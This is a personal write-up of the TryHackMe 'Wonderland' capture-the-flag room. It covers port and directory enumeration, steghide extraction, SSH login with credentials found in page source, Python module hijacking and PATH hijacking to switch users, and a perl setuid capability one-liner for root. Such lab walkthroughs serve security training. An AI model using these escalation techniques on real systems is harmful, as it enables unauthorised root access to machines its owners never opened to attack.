

# TryHackMe__wonderland__write up

In this write-up, I will walk through the Wonderland room on TryHackMe,
a medium-difficulty challenge that focuses on enumeration, privilege escalation, and creative problem-solving. 
I completed this machine from start to finish and documented each step clearly so that anyone reading this can follow the same process and understand the techniques involved.

The goal of this write-up is to demonstrate me methodology, explain why each step was taken, and highlight the key points that lead to gaining full access to the machine.
You will also find a screenshot of the room details attached below. 

![[2025-12-11_15-53.png]]


---

To begin the enumeration process, I conducted a basic port scan using the following Nmap command. The results show two open ports requiring further investigation :

> `nmap -sV -sC -O 10.67.165.26

![[images/nmap.png]]

 We will also use the gobuster tool on the website. 
 >`gobuster dir -u http://10.67.165.26/ -w wordlists/common.txt


![[gobuster.png]]

Now we go to the /img file shown by gobuster tool  and load the following image. 
> `http://10.67.165.26/img
> `http://10.67.165.26/img/white_rabbit_1.jpg
> `wget http://10.67.165.26/img/white_rabbit_1.jpg

![[2025-12-11_11-48.png]]

![[2025-12-11_11-49.png]]

After downloading the image, we will use the steghide tool like below command. 
> `steghide info white_rabbit_1.jpg
> `steghide extract -sf white_rabbit_1.jpg
> `cat hint.txt

![[2025-12-11_11-43.png]]

Now that we have read the hint in the text we can follow it in to the page. 
> `http://10.67.165.26/r/a/b/b/i/t/

![[2025-12-11_15-50.png]]

Then go to the source code of the page and we can see the username and password 


![[2025-12-11_11-53.png]]

Now we will login via the SSH port using the username password we obtained from the page source code 
>`ssh alice@10.67.165.26

![[2025-12-11_11-56.png]]

Now we have logged in as a alice user and we can read the user.txt flag
> `cat /root/user.txt


![[2025-12-11_12-14.png]]

So how did I switch the user ?

1. I made a file named random.py since that’s the module we want to hijack
2. in the file I typed:
   import os
   os.system(“/bin/bash”)
3. I ran the command sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py

It gave me the user rabbit which means I successfully managed to switch my first privilege.

>`cat > random.py << EOF
>`import os 
>`os.system("/bin/bash")
>`EOF

>`sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py

![[2025-12-11_12-20.png]]

Now we made a date file so that we can read the password file and switch to hatter user
you can follow below commands. 

>`cat > date << EOF
> `#!/bin/bash
> `/bin/bash
> `EOF
> 
` chmod +x date
` exprt PATH=/home/rabbit:$PATH
` ./teaParty

We now have permission to access the hatter folder and read the password.txt
>`cd /home/hatter
>`cat password.txt

![[2025-12-11_13-01.png]]

we will use the command :
>`getcap -r / 2>/dev/null

![[2025-12-11_13-02.png]]
There is perl capability that we can exploit.
>`https://gtfobins.github.io/gtfobins/perl/

>`perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

![[2025-12-11_12-41.png]]



I hope this report has been a helpful guide through Wonderland. Best of luck with your security adventures! 

Written by Aladeb on 2025/12/11
